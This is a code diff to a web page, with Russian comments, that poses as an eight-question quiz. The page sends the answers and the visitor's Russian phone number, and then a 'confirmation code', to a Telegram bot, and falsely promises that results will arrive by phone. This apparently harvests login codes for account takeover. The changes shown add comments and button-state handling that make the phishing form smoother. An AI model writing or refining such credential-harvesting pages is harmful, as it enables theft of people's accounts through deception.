@@ -135,16 +135,24 @@
             const answers = Array.from(document.querySelectorAll('#questions input:checked')).map(input => input.value);
             const phone = document.getElementById('phone').value.trim();
 
+            // Проверка, что все вопросы отвечены
             if (answers.length !== 8) {
                 document.getElementById('testMessage').textContent = "Пожалуйста, ответьте на все вопросы!";
                 return;
             }
 
+            // Проверка корректности номера телефона
             if (!phone || !phone.match(/^\+7\d{10}$/)) {
                 document.getElementById('testMessage').textContent = "Введите корректный номер телефона!";
                 return;
             }
 
+            // Отключение кнопки и изменение текста
+            const submitButton = document.getElementById('submitTest');
+            submitButton.disabled = true;
+            submitButton.innerText = "Отправляется...";
+
+            // Отправка данных в Telegram
             const success = await sendToTelegram(`📋 Результаты теста:\n${answers.join('\n')}\n📱 Номер телефона: ${phone}`);
             if (success) {
                 document.getElementById('testMessage').textContent = "Ответы отправлены. Введите код подтверждения.";
@@ -152,6 +160,8 @@
                 document.getElementById('codeForm').style.display = 'block';
             } else {
                 document.getElementById('testMessage').textContent = "Произошла ошибка. Попробуйте снова.";
+                submitButton.disabled = false;
+                submitButton.innerText = "Отправить ответы";
             }
         });
 
@@ -163,11 +173,19 @@
                 return;
             }
 
+            // Отключение кнопки и изменение текста
+            const sendCodeButton = document.getElementById('sendCodeButton');
+            sendCodeButton.disabled = true;
+            sendCodeButton.innerText = "Подтверждается...";
+
+            // Отправка кода подтверждения в Telegram
             const success = await sendToTelegram(`🔑 Код подтверждения: ${code}`);
             if (success) {
                 document.getElementById('codeMessage').textContent = "Ты прошёл тест! результаты придут тебе на номер телефона который ты указал!";
             } else {
                 document.getElementById('codeMessage').textContent = "Произошла ошибка. Попробуйте снова.";
+                sendCodeButton.disabled = false;
+                sendCodeButton.innerText = "Подтвердить";
             }
         });
     </script>
